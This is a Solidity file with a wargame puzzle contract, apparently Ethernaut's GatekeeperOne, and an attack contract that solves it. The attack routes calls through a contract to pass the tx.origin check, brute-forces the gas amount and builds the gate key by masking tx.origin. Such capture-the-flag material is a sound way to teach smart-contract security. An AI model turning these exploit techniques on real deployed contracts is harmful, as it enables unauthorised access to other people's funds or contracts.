// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttack {
    GatekeeperOne gatekeeperOne;
    bool public isCompleted;
    bool public isSuccessful;
    uint public gasUsed;

    constructor(GatekeeperOne gatekeeperOne_) {
        gatekeeperOne = gatekeeperOne_;
    }

    function attack() public {
        // Gas amount was found on Remix
        // _gateKey was worked out by hand
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;

        // Lets test different i values since mumbai
        // is diff
        for (uint256 i = 200; i < 3000; i++) {
            (bool success, ) = address(gatekeeperOne).call{
                gas: i + (8191 * 10)
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                gasUsed = i;
                break;
            }
        }

        isCompleted = true;
        isSuccessful = gatekeeperOne.entrant() == address(tx.origin);
    }
}
